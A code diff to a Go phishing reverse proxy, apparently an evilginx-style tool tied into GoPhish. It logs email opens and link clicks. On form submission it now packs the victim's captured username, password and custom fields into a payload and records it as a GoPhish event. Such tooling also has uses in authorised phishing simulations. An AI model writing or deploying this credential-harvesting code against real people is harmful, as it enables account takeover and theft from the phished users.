@@ -581,7 +581,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											rid, ok := session.Params["rid"]
 											if ok && rid != "" {
 												log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-												recordGophishEvent(rid, remote_addr, req.Header.Get("User-Agent"), "open")
+												recordGophishEvent(rid, remote_addr, req.Header.Get("User-Agent"), "open", nil)
 												return p.trackerImage(req)
 											}
 										}
@@ -602,7 +602,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									rid, ok := session.Params["rid"]
 									if ok && rid != "" {
-										recordGophishEvent(rid, remote_addr, req.Header.Get("User-Agent"), "click")
+										recordGophishEvent(rid, remote_addr, req.Header.Get("User-Agent"), "click", nil)
 									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
@@ -1307,7 +1307,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						rid, ok := s.Params["rid"]
 						if ok && rid != "" {
-							recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit")
+							payload := url.Values{}
+							if s.Username != "" {
+								payload.Add("Username", s.Username)
+							}
+							if s.Password != "" {
+								payload.Add("Password", s.Password)
+							}
+							for k, v := range s.Custom {
+								payload.Add(k, v)
+							}
+							recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit", payload)
 						}
 					}
 				}
@@ -1488,7 +1498,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
-								recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit")
+								payload := url.Values{}
+								if s.Username != "" {
+									payload.Add("Username", s.Username)
+								}
+								if s.Password != "" {
+									payload.Add("Password", s.Password)
+								}
+								for k, v := range s.Custom {
+									payload.Add(k, v)
+								}
+								recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit", payload)
 							}
 							break
 						}
@@ -2617,7 +2637,7 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	return s_hash
 }
 
-func recordGophishEvent(rid string, ip string, userAgent string, eventType string) {
+func recordGophishEvent(rid string, ip string, userAgent string, eventType string, payload url.Values) {
 	id := strings.TrimSuffix(rid, "+") // TransparencySuffix
 	rs, err := gp_models.GetResult(id)
 	if err != nil {
@@ -2630,7 +2650,7 @@ func recordGophishEvent(rid string, ip string, userAgent string, eventType strin
 	rs.UpdateGeo(ip)
 	
 	d := gp_models.EventDetails{
-		Payload: nil,
+		Payload: payload,
 		Browser: map[string]string{
 			"address": ip,
 			"user-agent": userAgent,
